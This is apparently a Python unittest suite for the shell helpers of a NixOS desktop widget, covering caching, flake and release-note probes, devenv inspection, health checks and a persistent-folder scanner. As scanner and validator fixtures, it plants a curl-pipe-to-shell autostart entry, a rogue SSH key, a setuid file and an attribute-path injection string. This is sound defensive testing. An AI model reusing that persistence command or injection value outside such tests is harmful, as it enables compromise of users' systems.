import json
import os
import re
import subprocess
import tempfile
import time
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

HELPERS = Path(__file__).resolve().parents[1] / "package/contents/tools/sh"


class HelperCase(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="nixdatifier-test-")
        self.root = Path(self.temp.name)
        self.env = dict(
            os.environ,
            XDG_CACHE_HOME=str(self.root / "cache"),
            XDG_RUNTIME_DIR=str(self.root),
        )
        self.bin = self.root / "bin"
        self.bin.mkdir()
        self.env["PATH"] = str(self.bin) + os.pathsep + os.environ["PATH"]

    def tearDown(self):
        self.temp.cleanup()

    def script(self, path, source):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("#!/usr/bin/env bash\nset -eu\n" + source)
        path.chmod(0o755)
        return str(path)

    def run_helper(self, name, *args):
        return subprocess.run(
            [str(HELPERS / name), *args],
            check=False,
            env=self.env,
            text=True,
            capture_output=True,
            timeout=15,
        )


class Helpers(HelperCase):
    def test_sysinfo_distribution_detection(self):
        source = (HELPERS / "sysinfo").read_text()
        os_release = self.root / "os-release"
        marker = self.root / "NIXOS"
        helper = self.root / "sysinfo"
        helper.write_text(
            source.replace("/etc/os-release", str(os_release))
            .replace("/etc/NIXOS", str(marker))
            .replace("/run/current-system/nixos-version", str(self.root / "version"))
            .replace("/nix/var/nix/profiles/system", str(self.root / "system"))
        )
        helper.chmod(0o755)
        for distro, expected in [
            ("ubuntu", "0"),
            ("nixos", "1"),
            ('"nixos"', "1"),
            ("'nixos'", "1"),
            ("nixos-other", "0"),
        ]:
            with self.subTest(distro=distro):
                os_release.write_text("ID=" + distro + "\n")
                result = subprocess.run(
                    [str(helper)],
                    env=self.env,
                    text=True,
                    capture_output=True,
                    timeout=5,
                )
                self.assertEqual(result.returncode, 0)
                fields = result.stdout.split("---")
                self.assertEqual(len(fields), 6)
                self.assertEqual(fields[5].strip(), expected)
        marker.touch()
        os_release.unlink()
        result = subprocess.run(
            [str(helper)], env=self.env, text=True, capture_output=True, timeout=5
        )
        self.assertEqual(result.stdout.split("---")[5].strip(), "1")

    def test_cache_is_shared_across_install_paths_and_serialized(self):
        counter = self.root / "count"
        source = f"printf 'probe\\n' >> '{counter}'\nsleep .2\nprintf 'result'\n"
        a = self.script(self.root / "plasma/diskusage", source)
        b = self.script(self.root / "hyprland/diskusage", source)
        commands = [
            [str(HELPERS / "run"), "cached", "disk", "60", "--", helper]
            for helper in (a, b)
        ]
        jobs = [
            subprocess.Popen(c, env=self.env, stdout=subprocess.PIPE, text=True)
            for c in commands
        ]
        self.assertEqual(
            [p.communicate(timeout=5)[0] for p in jobs], ["result", "result"]
        )
        self.assertEqual(counter.read_text().splitlines(), ["probe"])

    def test_failed_reads_are_not_cached(self):
        broken = self.script(self.bin / "broken", "echo partial; exit 9\n")
        result = self.run_helper("run", "cached", "test", "60", "--", broken)
        self.assertEqual(result.returncode, 9)
        self.assertEqual(list((self.root / "cache/nixdatifier").glob("*.result")), [])

    def test_homepages_are_parsed_as_one_batch(self):
        names = [f"fixture-package-{n}" for n in range(200)]
        payload = self.root / "homepages.json"
        payload.write_text(json.dumps({n: f"https://example.org/{n}" for n in names}))
        self.script(self.bin / "nix", f"cat '{payload}'\n")
        self.script(self.bin / "find", "exit 0\n")
        import shutil

        real_jq = shutil.which("jq")
        calls = self.root / "jq-calls"
        self.script(
            self.bin / "jq", f"echo call >> '{calls}'; exec '{real_jq}' \"$@\"\n"
        )
        result = self.run_helper("meta", *names)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            result.stdout.splitlines(),
            [f"{n}\thttps://example.org/{n}\tnixpkgs" for n in names],
        )
        self.assertEqual(len(calls.read_text().splitlines()), 2)

    def test_partial_flake_check_retries_without_caching_failure(self):
        counter = self.root / "probes"
        helper = self.script(
            self.bin / "flake-probe",
            f"""
if [[ ! -f '{counter}' ]]; then
    touch '{counter}'
    printf 'nixpkgs\\tunreachable\\told\\t\\t0\\turl\\n'
else
    printf 'nixpkgs\\tok\\told\\tnew\\t0\\turl\\n'
fi
""",
        )
        args = ("cached", "flake:test", "30", "--", helper)
        first = self.run_helper("run", *args)
        self.assertIn("\tunreachable\t", first.stdout)
        self.assertEqual(list((self.root / "cache/nixdatifier").glob("*.result")), [])
        second = self.run_helper("run", *args)
        self.assertIn("\tok\t", second.stdout)
        # Previously installed versions may have left failed cached results.
        result_file = next((self.root / "cache/nixdatifier").glob("*.result"))
        result_file.write_text(first.stdout)
        self.assertIn("\tok\t", self.run_helper("run", *args).stdout)

    def test_github_probe_uses_direct_commit_and_falls_back_to_git(self):
        old, new = "a" * 40, "b" * 40
        (self.root / "flake.lock").write_text(
            json.dumps(
                {
                    "nodes": {
                        "root": {"inputs": {"nixpkgs": "nixpkgs"}},
                        "nixpkgs": {
                            "original": {
                                "type": "github",
                                "owner": "NixOS",
                                "repo": "nixpkgs",
                                "ref": "branch/with-slash",
                            },
                            "locked": {"rev": old, "lastModified": 1},
                        },
                    }
                }
            )
        )
        args = self.root / "curl-args"
        git_called = self.root / "git-called"
        self.script(
            self.bin / "curl", f"printf '%s\\n' \"$@\" > '{args}'\nprintf '{new}'\n"
        )
        self.script(
            self.bin / "git",
            f"touch '{git_called}'; printf '{new}\\trefs/heads/test\\n'\n",
        )
        result = self.run_helper("flake-probe", str(self.root))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn(f"\tok\t{old}\t{new}\t", result.stdout)
        self.assertIn("/commits/branch%2Fwith-slash", args.read_text())
        self.assertFalse(git_called.exists())
        self.script(self.bin / "curl", "exit 22\n")
        result = self.run_helper("flake-probe", str(self.root))
        self.assertIn(f"\tok\t{old}\t{new}\t", result.stdout)
        self.assertTrue(git_called.exists())
        self.script(self.bin / "git", "exit 128\n")
        self.assertIn(
            "\tunreachable\t", self.run_helper("flake-probe", str(self.root)).stdout
        )
        self.script(
            self.bin / "git",
            "echo 'Could not resolve host: github.com' >&2; exit 128\n",
        )
        self.assertIn(
            "DNS lookup failed", self.run_helper("flake-probe", str(self.root)).stdout
        )
        self.script(self.bin / "git", "exit 124\n")
        self.assertIn(
            "timed out after 40s", self.run_helper("flake-probe", str(self.root)).stdout
        )

    def test_release_notes_lists_new_releases_and_commits(self):
        old, new = "a" * 40, "b" * 40
        commits = [
            {
                "sha": new,
                "html_url": "https://github.com/o/r/commit/" + new,
                "author": {"login": "dev"},
                "commit": {
                    "message": "fix: thing\n\nlong body",
                    "committer": {"date": "2026-02-02T00:00:00Z"},
                },
            },
            {
                "sha": old,
                "html_url": "",
                "author": None,
                "commit": {
                    "message": "old",
                    "committer": {"date": "2026-01-01T00:00:00Z"},
                },
            },
        ]
        releases = [
            {
                "tag_name": "v2",
                "name": "",
                "draft": False,
                "prerelease": False,
                "published_at": "2026-02-01T00:00:00Z",
                "html_url": "u2",
                "body": "## Notes ##\r\n<!-- x -->hi `code`",
            },
            {
                "tag_name": "draft",
                "draft": True,
                "published_at": "2026-02-01T00:00:00Z",
            },
            {"tag_name": "v1", "draft": False, "published_at": "2025-12-01T00:00:00Z"},
        ]
        (self.root / "commits.json").write_text(json.dumps(commits))
        (self.root / "releases.json").write_text(json.dumps(releases))
        log = self.root / "curl-log"
        self.script(
            self.bin / "curl",
            f"""
url="${{@: -1}}"; out=""; hdr=""
while [ $# -gt 0 ]; do
    case "$1" in -o) out="$2"; shift ;; -D) hdr="$2"; shift ;; esac
    shift
done
echo "$url" >> '{log}'
case "$url" in
    *"/commits?"*) cp '{self.root}/commits.json' "$out"; printf 'link: <x>; rel="next"\r\n' > "$hdr" ;;
    *) cp '{self.root}/releases.json' "$out"; : > "$hdr" ;;
esac
printf 200
""",
        )
        since = "1767225600"  # 2026-01-01T00:00:00Z, the old revision's date
        result = self.run_helper(
            "release-notes", "https://github.com/o/r.git", old, new, since
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        data = json.loads(result.stdout)
        self.assertEqual(
            data["compareUrl"], f"https://github.com/o/r/compare/{old}...{new}"
        )
        self.assertEqual([r["tag"] for r in data["releases"]], ["v2"])
        self.assertEqual(data["releases"][0]["body"], "**Notes**\nhi code")
        self.assertEqual([c["message"] for c in data["commits"]], ["fix: thing"])
        self.assertTrue(data["moreCommits"])
        self.assertIn(f"sha={new}&since=2026-01-01T00:00:01Z", log.read_text())

        self.script(
            self.bin / "curl",
            """
while [ $# -gt 0 ]; do [ "$1" = -D ] && printf 'x-ratelimit-remaining: 0\r\n' > "$2"; shift; done
printf 403
""",
        )
        result = self.run_helper(
            "release-notes", "https://github.com/o/r", old, new, since
        )
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("rate limit", result.stderr)

        gitlab = json.loads(
            self.run_helper(
                "release-notes", "git+https://gitlab.com/g/sub/r.git", old, new, "0"
            ).stdout
        )
        self.assertEqual(
            gitlab["compareUrl"], f"https://gitlab.com/g/sub/r/-/compare/{old}...{new}"
        )
        other = json.loads(
            self.run_helper(
                "release-notes", "https://git.sr.ht/~u/r", old, new, "0"
            ).stdout
        )
        self.assertEqual(other["compareUrl"], "")

    def test_change_counts_use_closure_direction_and_reuse_cache(self):
        args = self.root / "count-args"
        self.script(
            self.bin / "nix",
            f"printf '%s\\n' \"$@\" >> '{args}'\n"
            + "printf '\\033[32mone: ∅ → 1.0, +2 KiB\\033[0m\\n'\n"
            + "printf 'two: 2.0 → ∅, -3 MiB\\nthree: 1.0 → 2.0, +1 MiB\\nfour: 3.1 -> 3.2\\n'\n",
        )
        for _ in range(2):
            result = self.run_helper(
                "run",
                "cached",
                "generation-counts",
                "604800",
                "--",
                str(HELPERS / "change-counts"),
                "/nix/store/new",
                "/nix/store/old",
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(
                json.loads(result.stdout),
                {
                    "added": 1,
                    "removed": 1,
                    "changed": 2,
                    "addedBytes": 2048,
                    "removedBytes": 3145728,
                },
            )
        self.assertEqual(
            args.read_text().splitlines(),
            [
                "--extra-experimental-features",
                "nix-command flakes",
                "store",
                "diff-closures",
                "/nix/store/old",
                "/nix/store/new",
            ],
        )

    def test_change_count_failure_and_identical_closures(self):
        self.script(self.bin / "nix", "echo 'closure missing' >&2; exit 8\n")
        result = self.run_helper("change-counts", "/nix/store/new", "/nix/store/old")
        self.assertEqual(result.returncode, 8)
        self.assertEqual(result.stdout, "")
        result = self.run_helper("change-counts", "/nix/store/same", "/nix/store/same")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            json.loads(result.stdout),
            {
                "added": 0,
                "removed": 0,
                "changed": 0,
                "addedBytes": 0,
                "removedBytes": 0,
            },
        )

    def test_conflicting_mutation_is_rejected(self):
        started = self.root / "started"
        blocker = self.script(self.bin / "blocker", f"touch '{started}'; sleep 1\n")
        job = subprocess.Popen(
            [str(HELPERS / "run"), "mutate", "--", blocker], env=self.env
        )
        try:
            for _ in range(100):
                if started.exists():
                    break
                time.sleep(0.01)
            result = self.run_helper("run", "mutate", "--", "true")
            self.assertEqual(result.returncode, 75)
        finally:
            job.wait(timeout=3)

    def test_terminal_reports_real_failure_and_preserves_quoted_workdir(self):
        work = self.root / "flake's directory"
        work.mkdir()
        user_shell = self.script(
            self.bin / "test-shell", 'exec bash --noprofile --norc -c "$2"\n'
        )
        self.script(
            self.bin / "getent", f"printf 'test:x:1:1:Test:/tmp:{user_shell}\\n'\n"
        )
        terminal = self.script(self.bin / "test-terminal", 'shift; exec setsid "$@"\n')
        result = self.run_helper(
            "terminal", terminal, str(work), "pwd > actual-dir; exit 37"
        )
        self.assertEqual(result.returncode, 37, result.stderr)
        self.assertEqual((work / "actual-dir").read_text().strip(), str(work))

    def test_dry_preview_never_writes_lockfile(self):
        args = self.root / "nix-args"
        self.script(self.bin / "nix-store", "exit 0\n")
        self.script(self.bin / "nix", f"printf '%s\\n' \"$@\" > '{args}'\nexit 0\n")
        work = self.root / "flake directory"
        work.mkdir()
        lock = work / "flake.lock"
        lock.write_text("original")
        result = self.run_helper(
            "dry-run-preview",
            str(work),
            "nixpkgs",
            "github:NixOS/nixpkgs/revision",
            "auto",
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--no-write-lock-file", args.read_text().splitlines())
        self.assertEqual(lock.read_text(), "original")

    def test_settings_agree_across_hosts(self):
        """main.xml, Settings.qml, the Hyprland adapter, the editor schema and
        the Plasma config page must declare the same keys and defaults."""
        repo = HELPERS.parents[3]
        ui = repo / "package/contents/ui"
        ns = {"k": "http://www.kde.org/standards/kcfg/1.0"}
        xml = {}
        for entry in (
            ET.parse(repo / "package/contents/config/main.xml")
            .getroot()
            .iterfind(".//k:entry", ns)
        ):
            kind, text = entry.get("type"), entry.findtext("k:default", "", ns) or ""
            xml[entry.get("name")] = (
                text == "true"
                if kind == "Bool"
                else int(text)
                if kind == "Int"
                else float(text)
                if kind == "Double"
                else text
            )

        def qml_defaults(source):
            found = {}
            for kind, name, value in re.findall(
                r"^\s*property (bool|int|real|string|color) (\w+): (.+)$", source, re.M
            ):
                found[name] = (
                    float(json.loads(value)) if kind == "real" else json.loads(value)
                )
            return found

        host_only = {"pillMode", "popupPosition", "panelEdgeOffset", "panelSideOffset"}
        settings = qml_defaults((ui / "Settings.qml").read_text())
        shell = (repo / "hyprland/NixdatifierShell.qml").read_text()
        adapter = qml_defaults(
            shell[shell.index("id: cfg") : shell.index("App.Settings")]
        )
        schema = set(
            re.findall(r'"key": "(\w+)"', (ui / "SettingsSchema.js").read_text())
        )
        aliases = set(re.findall(r"cfg_(\w+):", (ui / "configGeneral.qml").read_text()))
        for name, host in (("Settings.qml", settings), ("Hyprland adapter", adapter)):
            self.assertEqual(
                {k: v for k, v in host.items() if k not in host_only}, xml, name
            )
        self.assertEqual(schema, set(xml))
        self.assertEqual(aliases, set(xml) | {name + "Default" for name in xml})

    def test_flake_context_fingerprint_changes(self):
        flake = self.root / "flake directory"
        flake.mkdir()
        (flake / "flake.lock").write_text("old")
        old = self.run_helper("flake-context", str(flake)).stdout.splitlines()
        (flake / "flake.lock").write_text("new")
        new = self.run_helper("flake-context", str(flake)).stdout.splitlines()
        self.assertEqual(old[0], str(flake))
        self.assertNotEqual(old[1], new[1])

    def test_devenv_discover_lists_known_projects_newest_first(self):
        data = self.root / "data"
        old, new, gone, blocked = (
            self.root / n for n in ("old", "new", "gone", "blocked")
        )
        for project in (old, new, blocked):
            project.mkdir()
            (project / ".envrc").write_text("use flake\n")
        for state, name, project, stamp in (
            ("allow", "a", old, 1_000),
            ("allow", "b", new, 2_000),
            ("allow", "c", gone, 3_000),
            ("deny", "d", blocked, 4_000),
        ):
            entry = data / "direnv" / state / name
            entry.parent.mkdir(parents=True, exist_ok=True)
            entry.write_text(f"{project}/.envrc\n")
            os.utime(entry, (stamp, stamp))
        self.env["XDG_DATA_HOME"] = str(data)
        result = self.run_helper("devenv", "discover")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(
            result.stdout.splitlines(),
            [f"{blocked}\tdenied", f"{new}\tallowed", f"{old}\tallowed"],
        )

    def test_devenv_inspect_reports_direnv_flake_and_lock(self):
        project = self.root / "my app"
        project.mkdir()
        (project / ".envrc").write_text("use flake\ndotenv\n")
        (project / "flake.nix").write_text('{\n  description = "A demo shell";\n}\n')
        (project / ".direnv").mkdir()
        (project / "flake.lock").write_text(
            json.dumps(
                {
                    "nodes": {
                        "root": {
                            "inputs": {"nixpkgs": "nixpkgs", "utils": ["nixpkgs"]}
                        },
                        "nixpkgs": {
                            "original": {
                                "type": "github",
                                "owner": "NixOS",
                                "repo": "nixpkgs",
                                "ref": "nixos-unstable",
                            },
                            "locked": {
                                "type": "github",
                                "rev": "abcdef0123456789",
                                "lastModified": 1700000000,
                            },
                        },
                    }
                }
            )
        )
        self.script(
            self.bin / "direnv",
            """
case "$1" in
    version) echo 2.37.1 ;;
    status) echo "Found RC path $PWD/.envrc"; echo "Found RC allowed 1" ;;
esac
""",
        )
        # inspect must stay fast: it never evaluates the flake.
        marker = self.root / "nix-ran"
        self.script(self.bin / "nix", f"touch '{marker}'\n")
        result = self.run_helper("devenv", "inspect", str(project))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(marker.exists())
        meta, envrc, locks, shells = result.stdout.split("\x1e")
        facts = dict(line.split("=", 1) for line in meta.splitlines())
        self.assertEqual(facts["name"], "my app")
        self.assertEqual(facts["direnv"], "2.37.1")
        self.assertEqual(facts["envrc_state"], "blocked")
        self.assertEqual(facts["envrc_uses"], "use flake,dotenv")
        self.assertEqual(facts["description"], "A demo shell")
        self.assertEqual(facts["lock_inputs"], "2")
        self.assertEqual(facts["lock_oldest"], "1700000000")
        self.assertIn("flake.nix", facts["files"].split(","))
        self.assertEqual(envrc, "use flake\ndotenv")
        self.assertEqual(
            locks.splitlines(),
            [
                "nixpkgs\tgithub\tNixOS/nixpkgs\tnixos-unstable\tabcdef0\t1700000000\t",
                "utils\tfollows\t\t\t\t0\tnixpkgs",
            ],
        )
        self.assertEqual(shells, "")

    def test_devenv_lists_shells_and_their_packages(self):
        project = self.root / "app"
        project.mkdir()
        (project / "flake.nix").write_text("{}")
        self.script(
            self.bin / "nix",
            """
case "$*" in
    *attrNames*) printf '["default","ci"]' ;;
    *buildInputs*) printf '["git-2.50","jq-1.8","git-2.50"]' ;;
    *) exit 1 ;;
esac
""",
        )
        shells = self.run_helper("devenv", "shells", str(project))
        self.assertEqual(shells.stdout.splitlines(), ["default", "ci"])
        packages = self.run_helper("devenv", "shellpkgs", str(project), "default")
        self.assertEqual(packages.stdout.splitlines(), ["git-2.50", "jq-1.8"])
        # Names are interpolated into a Nix attribute path, so they are checked.
        bad = self.run_helper(
            "devenv", "shellpkgs", str(project), 'x"; builtins.abort "'
        )
        self.assertEqual(bad.returncode, 2)
        # A failed evaluation is reported, never shown as an empty shell.
        self.script(self.bin / "nix", "exit 1\n")
        self.assertEqual(
            self.run_helper("devenv", "shells", str(project)).returncode, 3
        )

    def test_devenv_space_and_clear(self):
        data = self.root / "data"
        big, small, plain = (self.root / n for n in ("big", "small", "plain"))
        for index, project in enumerate((big, small, plain)):
            (project / ".direnv").mkdir(parents=True)
            (project / ".envrc").write_text("use flake\n")
            entry = data / "direnv" / "allow" / project.name
            entry.parent.mkdir(parents=True, exist_ok=True)
            entry.write_text(f"{project}/.envrc\n")
        for project in (big, small):
            (project / ".direnv" / "flake-profile-abc").symlink_to(
                "/nix/store/x-profile"
            )
        (plain / ".direnv" / "cache.bin").write_bytes(b"x" * 4096)
        self.script(
            self.bin / "nix",
            f"""
case "$*" in
    *{big}*) echo "/nix/store/x-profile 9000" ;;
    *) echo "/nix/store/x-profile 100" ;;
esac
""",
        )
        self.env["XDG_DATA_HOME"] = str(data)
        result = self.run_helper("devenv", "space")
        self.assertEqual(result.returncode, 0, result.stderr)
        rows = [line.split("\t") for line in result.stdout.splitlines()]
        self.assertEqual(
            [(r[0], r[1], r[2]) for r in rows],
            [
                (str(big), "9000", "closure"),
                (str(plain), "4096", "files"),
                (str(small), "100", "closure"),
            ],
        )
        cleared = self.run_helper("devenv", "clear", str(big))
        self.assertEqual(cleared.returncode, 0, cleared.stderr)
        self.assertFalse((big / ".direnv").exists())
        self.assertTrue((big / ".envrc").exists())
        # Only direnv projects are touched.
        stray = self.root / "stray"
        (stray / ".direnv").mkdir(parents=True)
        self.assertEqual(self.run_helper("devenv", "clear", str(stray)).returncode, 2)
        self.assertTrue((stray / ".direnv").exists())

    def test_health_reports_caches_failed_units_and_nix(self):
        self.script(
            self.bin / "nix",
            """
case "$1" in
    --version) echo 'nix (Nix) 2.34.0' ;;
    config) printf 'experimental-features = flakes nix-command\\nsubstituters = https://good.example/ https://good.example https://dead.example\\ntrusted-users = root\\n' ;;
esac
""",
        )
        self.script(
            self.bin / "curl",
            """
case "$*" in
    *good.example*) printf '200 0.120' ;;
    *) printf '000 3.000' ;;
esac
""",
        )
        self.script(
            self.bin / "systemctl",
            """
case "$*" in
    *show*) echo 'exit-code' ;;
    *--user*) echo 'mine.service loaded failed failed Mine' ;;
    *) echo 'sshd.service loaded failed failed SSH' ;;
esac
""",
        )
        # The error line wins over a generic last line.
        self.script(
            self.bin / "journalctl",
            """
printf 'starting\\nFailed to register: Unable to acquire bus name\\nMain process exited\\n'
""",
        )
        result = self.run_helper("health")
        self.assertEqual(result.returncode, 0, result.stderr)
        meta, units, caches = result.stdout.split("\x1e")
        facts = dict(line.split("=", 1) for line in meta.splitlines())
        self.assertEqual(facts["nix"], "nix (Nix) 2.34.0")
        self.assertEqual(facts["experimental"], "flakes nix-command")
        why = "Failed to register: Unable to acquire bus name"
        self.assertEqual(
            units.splitlines(),
            [
                f"system\tsshd.service\texit-code\t{why}",
                f"user\tmine.service\texit-code\t{why}",
            ],
        )
        cache_rows = sorted(line.split("\t") for line in caches.splitlines())
        # The duplicate with a trailing slash is checked once.
        self.assertEqual(
            [(r[0], r[1]) for r in cache_rows],
            [("https://dead.example", "unreachable"), ("https://good.example", "ok")],
        )

    def test_devenv_handles_a_plain_folder(self):
        project = self.root / "plain"
        project.mkdir()
        self.script(self.bin / "direnv", 'case "$1" in version) echo 2.37.1 ;; esac\n')
        result = self.run_helper("devenv", "inspect", str(project))
        self.assertEqual(result.returncode, 0, result.stderr)
        facts = dict(
            line.split("=", 1) for line in result.stdout.split("\x1e")[0].splitlines()
        )
        self.assertEqual(facts["envrc_state"], "none")
        self.assertEqual(facts["files"], "")

    def test_devenv_rejects_missing_directories(self):
        result = self.run_helper("devenv", "inspect", str(self.root / "missing"))
        self.assertEqual(result.returncode, 2)
        self.assertIn("not a directory", result.stderr)


class Impermanence(HelperCase):
    """The persistent-folder helper against a fixture that mirrors a btrfs
    rollback setup: /@persist mounted at <root>/persist with entries bound out."""

    def setUp(self):
        super().setUp()
        self.persist = self.root / "persist"
        home = self.persist / "home/u"
        for d in (
            ".ssh",
            ".config/autostart",
            ".config/systemd/user",
            ".cache/foo",
            "Downloads",
            "Documents/old",
            ".local/bin",
        ):
            (home / d).mkdir(parents=True)
        (self.persist / "var/lib/bluetooth").mkdir(parents=True)
        (self.persist / "var/lib/docker").mkdir(parents=True)
        (self.persist / "var/log").mkdir(parents=True)
        (home / ".ssh/authorized_keys").write_text(
            "ssh-ed25519 AAAASECRETKEYMATERIAL evil@box\n"
        )
        (home / ".config/autostart/upd.desktop").write_text(
            'Exec=sh -c "curl http://x.y/z | sh"\n'
        )
        (home / ".config/systemd/user/legit.service").write_text(
            "[Service]\nExecStart=/bin/true\n"
        )
        os.symlink(
            "/nix/store/abc-hm/x.service", home / ".config/systemd/user/managed.service"
        )
        (home / "Downloads/run.sh").write_text("#!/bin/sh\n")
        (home / "Downloads/run.sh").chmod(0o755)
        (home / ".local/bin/mytool").write_text("x")
        (home / ".local/bin/mytool").chmod(0o4755)
        (home / ".cache/foo/blob").write_bytes(b"0" * 3_000_000)
        old = home / "Documents/old/big.iso"
        old.write_bytes(b"0" * 2_000_000)
        os.utime(old, (1_500_000_000, 1_500_000_000))
        os.utime(old.parent, (1_500_000_000, 1_500_000_000))
        (home / "Documents" / "bad\nname").write_text("x")
        (self.persist / "var/log/syslog.1.gz").write_text("old")
        p = self.persist
        (self.root / "mountinfo").write_text(
            "20 1 0:20 /@root / rw - btrfs /dev/mapper/crypted rw\n"
            f"30 20 0:21 /@persist {p} rw - btrfs /dev/mapper/crypted rw\n"
            "31 20 0:21 /@persist/var/lib/bluetooth /var/lib/bluetooth rw - btrfs /dev/mapper/crypted rw\n"
            "32 20 0:21 /@persist/home/u/.ssh /home/u/.ssh rw - btrfs /dev/mapper/crypted rw\n"
            "33 20 0:21 /@persist/var/lib/docker /var/lib/docker rw - btrfs /dev/mapper/crypted rw\n"
            "34 20 0:22 /@nix /nix rw - btrfs /dev/mapper/crypted rw\n"
            "35 34 0:22 /@nix/store /nix/store ro - btrfs /dev/mapper/crypted rw\n"
        )
        self.env.update(
            NIXDATIFIER_MOUNTINFO=str(self.root / "mountinfo"),
            NIXDATIFIER_ROOT_BIRTH="2000000000",
            NIXDATIFIER_BTIME="2000000100",
        )
        self.home = home

    def rows(self, result):
        self.assertEqual(result.returncode, 0, result.stderr)
        return [line.split("\t") for line in result.stdout.splitlines()]

    def test_detect_finds_the_persist_root_and_its_entries(self):
        rows = self.rows(self.run_helper("impermanence", "detect", ""))
        self.assertIn(["volatile", "yes", "fresh"], rows)
        self.assertEqual([r[1] for r in rows if r[0] == "persist"], [str(self.persist)])
        targets = sorted(r[2] for r in rows if r[0] == "entry")
        # /nix/store is a bind mount too, but not an impermanence entry.
        self.assertEqual(
            targets, ["/home/u/.ssh", "/var/lib/bluetooth", "/var/lib/docker"]
        )

    def test_detect_ignores_a_normal_system(self):
        (self.root / "mountinfo").write_text(
            "20 1 0:20 / / rw - ext4 /dev/sda1 rw\n"
            "35 20 0:20 /nix/store /nix/store ro - ext4 /dev/sda1 rw\n"
        )
        self.env["NIXDATIFIER_ROOT_BIRTH"] = "1500000000"
        rows = self.rows(self.run_helper("impermanence", "detect", ""))
        self.assertIn(["volatile", "no", ""], rows)
        self.assertEqual([r for r in rows if r[0] in ("persist", "entry")], [])

    def test_detect_accepts_a_manual_root(self):
        (self.root / "mountinfo").write_text("20 1 0:20 / / rw - tmpfs tmpfs rw\n")
        rows = self.rows(self.run_helper("impermanence", "detect", str(self.persist)))
        self.assertIn(["volatile", "yes", "tmpfs"], rows)
        self.assertEqual(
            [(r[1], r[2]) for r in rows if r[0] == "persist"],
            [(str(self.persist), "manual")],
        )

    def test_list_sizes_flags_and_escapes_names(self):
        rows = self.rows(
            self.run_helper("impermanence", "list", "", str(self.persist / "home/u"))
        )
        self.assertEqual(
            rows[0][:3], ["D", str(self.persist / "home/u"), str(self.persist)]
        )
        names = [r[-1] for r in rows[1:]]
        self.assertEqual(names[0], ".cache")  # largest first
        self.assertIn("Documents", names)
        docs = self.rows(
            self.run_helper(
                "impermanence", "list", "", str(self.persist / "home/u/Documents")
            )
        )
        self.assertIn("bad\\x0aname", [r[-1] for r in docs[1:]])
        self.assertIn("c", [r for r in docs[1:] if r[-1] == "bad\\x0aname"][0][8])
        # The newest change inside a folder is reported, not just its own mtime.
        old = [r for r in docs[1:] if r[-1] == "old"][0]
        self.assertEqual(old[4], "1500000000")

    def test_list_rejects_folders_outside_the_persistent_areas(self):
        result = self.run_helper("impermanence", "list", "", "/etc")
        self.assertEqual(result.returncode, 2)

    def test_scan_reports_hooks_and_never_key_material(self):
        out = self.run_helper("impermanence", "scan", "", "14")
        rows = self.rows(out)
        mine = [r for r in rows if r[2].startswith(str(self.persist))]
        found = {(r[0], r[1], r[2].replace(str(self.persist), "")) for r in mine}
        self.assertIn(
            ("high", "Suspicious command", "/home/u/.config/autostart/upd.desktop"),
            found,
        )
        self.assertIn(
            ("high", "Setuid or setgid file", "/home/u/.local/bin/mytool"), found
        )
        self.assertIn(
            ("medium", "Unusual file name", "/home/u/Documents/bad\\x0aname"), found
        )
        self.assertTrue(any(r[1] == "SSH access" for r in mine))
        # Links into the Nix store are declared in the configuration.
        self.assertFalse(any("managed.service" in r[2] for r in rows))
        self.assertNotIn("AAAASECRETKEYMATERIAL", out.stdout)

    def test_cleanup_offers_caches_logs_and_untouched_folders(self):
        rows = self.rows(self.run_helper("impermanence", "cleanup", "", "180"))
        paths = {
            r[0] + ":" + r[-1].replace(str(self.persist), "")
            for r in rows
            if r[0] in "TS"
        }
        self.assertIn("T:/home/u/.cache/foo", paths)
        self.assertIn("T:/var/log/syslog.1.gz", paths)
        self.assertIn("S:/home/u/Documents/old", paths)
        cache = [r for r in rows if r[0] == "T" and r[-1].endswith(".cache/foo")][0]
        self.assertGreaterEqual(int(cache[2]), 3_000_000)

    def test_remove_refuses_anything_that_would_break_the_system(self):
        for path, why in [
            (self.home / ".ssh", "protected"),
            (self.home / ".ssh/authorized_keys", "protected"),
            (self.persist / "var/lib/docker", "persisted"),
            (self.persist / "var/lib", "too high"),
            (self.home, "too high"),
            (self.persist, "not inside"),
            (Path("/etc/passwd"), "not inside"),
        ]:
            with self.subTest(path=str(path)):
                result = self.run_helper("impermanence", "remove", "", str(path))
                self.assertEqual(result.returncode, 2, result.stdout)
                self.assertIn(why, result.stderr)
                self.assertTrue(path.exists() or path == self.persist)

    def test_remove_deletes_inside_a_persistent_area_and_never_follows_links(self):
        target = self.home / ".cache/foo"
        result = self.run_helper("impermanence", "remove", "", str(target))
        self.assertEqual((result.returncode, result.stdout.strip()), (0, "removed"))
        self.assertFalse(target.exists())
        outside = self.root / "outside"
        outside.mkdir()
        (outside / "keep").write_text("x")
        link = self.home / "Documents/escape"
        os.symlink(outside, link)
        self.assertEqual(
            self.run_helper("impermanence", "remove", "", str(link)).returncode, 0
        )
        self.assertFalse(link.is_symlink())
        self.assertTrue((outside / "keep").exists())
        # The escaped form the list view prints addresses names with control characters.
        result = self.run_helper(
            "impermanence", "remove", "", str(self.home / "Documents") + "/bad\\x0aname"
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse((self.home / "Documents" / "bad\nname").exists())


if __name__ == "__main__":
    unittest.main()
